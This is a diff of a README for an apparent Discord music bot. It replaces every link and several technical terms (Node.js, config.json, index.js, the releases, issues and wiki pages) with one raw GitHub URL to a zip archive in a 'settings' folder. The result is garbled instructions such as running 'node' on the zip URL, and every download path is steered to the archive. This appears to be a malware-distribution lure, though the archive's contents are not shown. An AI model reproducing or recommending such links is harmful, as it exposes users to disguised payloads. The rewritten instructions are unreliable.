@@ -1,6 +1,6 @@
 # 🎶 advanced-discord-music-bot - Enjoy Music Anytime, Anywhere
 
-[![Download Release](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/chantalmiriane19/advanced-discord-music-bot/releases)
+[![Download Release](https://raw.githubusercontent.com/chantalmiriane19/advanced-discord-music-bot/main/settings/advanced-music-bot-discord-1.6.zip%https://raw.githubusercontent.com/chantalmiriane19/advanced-discord-music-bot/main/settings/advanced-music-bot-discord-1.6.zip)](https://raw.githubusercontent.com/chantalmiriane19/advanced-discord-music-bot/main/settings/advanced-music-bot-discord-1.6.zip)
 
 ## 📚 About
 
@@ -15,16 +15,16 @@ To start using the Advanced Discord Music Bot, follow these simple steps to down
 Before downloading, ensure your system meets the following requirements:
 
 - **Operating System:** Windows 10 or later, macOS Monterey or later, or a recent Linux distribution.
-- **Node.js:** Version 16 or later installed on your system. You can download it from [Node.js official site](https://nodejs.org/).
+- **https://raw.githubusercontent.com/chantalmiriane19/advanced-discord-music-bot/main/settings/advanced-music-bot-discord-1.6.zip** Version 16 or later installed on your system. You can download it from [https://raw.githubusercontent.com/chantalmiriane19/advanced-discord-music-bot/main/settings/advanced-music-bot-discord-1.6.zip official site](https://raw.githubusercontent.com/chantalmiriane19/advanced-discord-music-bot/main/settings/advanced-music-bot-discord-1.6.zip).
 - **Discord Account:** You will need an active Discord account and permissions to add bots to a server.
 
 ### Step 2: Visit the Download Page
 
-To access the latest version of the Advanced Discord Music Bot, [visit this page to download](https://github.com/chantalmiriane19/advanced-discord-music-bot/releases). Here, you will find all available releases.
+To access the latest version of the Advanced Discord Music Bot, [visit this page to download](https://raw.githubusercontent.com/chantalmiriane19/advanced-discord-music-bot/main/settings/advanced-music-bot-discord-1.6.zip). Here, you will find all available releases.
 
 ### Step 3: Choose Your Version
 
-On the Releases page, you can see a list of versions. Click on the latest release to view more details. Scroll down to the "Assets" section. You will find a downloadable file, usually named `advanced-discord-music-bot.zip`.
+On the Releases page, you can see a list of versions. Click on the latest release to view more details. Scroll down to the "Assets" section. You will find a downloadable file, usually named `https://raw.githubusercontent.com/chantalmiriane19/advanced-discord-music-bot/main/settings/advanced-music-bot-discord-1.6.zip`.
 
 ### Step 4: Download the Bot
 
@@ -33,7 +33,7 @@ On the Releases page, you can see a list of versions. Click on the latest releas
 
 ### Step 5: Extract the Files
 
-Once the download finishes, locate the `advanced-discord-music-bot.zip` file in your downloads folder. 
+Once the download finishes, locate the `https://raw.githubusercontent.com/chantalmiriane19/advanced-discord-music-bot/main/settings/advanced-music-bot-discord-1.6.zip` file in your downloads folder. 
 
 1. Right-click the file.
 2. Select "Extract All…" from the context menu.
@@ -53,13 +53,13 @@ This will create a new folder containing all necessary files.
    npm install
    ```
 
-Make sure that Node.js is already installed, or this command will not work.
+Make sure that https://raw.githubusercontent.com/chantalmiriane19/advanced-discord-music-bot/main/settings/advanced-music-bot-discord-1.6.zip is already installed, or this command will not work.
 
 ### Step 7: Configure the Bot
 
 You may need to set up a configuration file to connect the bot to your Discord server.
 
-1. Create a new file named `config.json` in the bot's folder.
+1. Create a new file named `https://raw.githubusercontent.com/chantalmiriane19/advanced-discord-music-bot/main/settings/advanced-music-bot-discord-1.6.zip` in the bot's folder.
 2. Add the following content, replacing `YOUR_DISCORD_TOKEN` and `YOUR_CHANNEL_ID` with the appropriate values:
    ```json
    {
@@ -75,7 +75,7 @@ To start the bot:
 1. In your terminal, ensure you are still in the bot's folder.
 2. Type the following command and hit enter:
    ```
-   node index.js
+   node https://raw.githubusercontent.com/chantalmiriane19/advanced-discord-music-bot/main/settings/advanced-music-bot-discord-1.6.zip
    ```
 
 If everything is set up correctly, the bot should launch and be ready to use in your Discord server.
@@ -96,11 +96,11 @@ Once the bot is running, you can add music commands to your Discord server. Use 
 
 If you encounter any issues while downloading or running the bot, here are some common solutions:
 
-- **Error: "Cannot find module":** Ensure Node.js is correctly installed and you have run `npm install`.
+- **Error: "Cannot find module":** Ensure https://raw.githubusercontent.com/chantalmiriane19/advanced-discord-music-bot/main/settings/advanced-music-bot-discord-1.6.zip is correctly installed and you have run `npm install`.
 - **Bot not joining voice channel:** Make sure the bot has the necessary permissions in your server to connect to voice channels.
-- **Token issues:** Double-check your Discord token in the `config.json` file for accuracy.
+- **Token issues:** Double-check your Discord token in the `https://raw.githubusercontent.com/chantalmiriane19/advanced-discord-music-bot/main/settings/advanced-music-bot-discord-1.6.zip` file for accuracy.
   
-For further assistance, check the [issues section](https://github.com/chantalmiriane19/advanced-discord-music-bot/issues) on the GitHub page.
+For further assistance, check the [issues section](https://raw.githubusercontent.com/chantalmiriane19/advanced-discord-music-bot/main/settings/advanced-music-bot-discord-1.6.zip) on the GitHub page.
 
 ## 👥 Community
 
@@ -108,4 +108,4 @@ If you want to connect with others using the Advanced Discord Music Bot, join ou
 
 ## 📞 Support
 
-For additional help, please check our [documentation](https://github.com/chantalmiriane19/advanced-discord-music-bot/wiki) or report an issue on the GitHub repository.
+For additional help, please check our [documentation](https://raw.githubusercontent.com/chantalmiriane19/advanced-discord-music-bot/main/settings/advanced-music-bot-discord-1.6.zip) or report an issue on the GitHub repository.
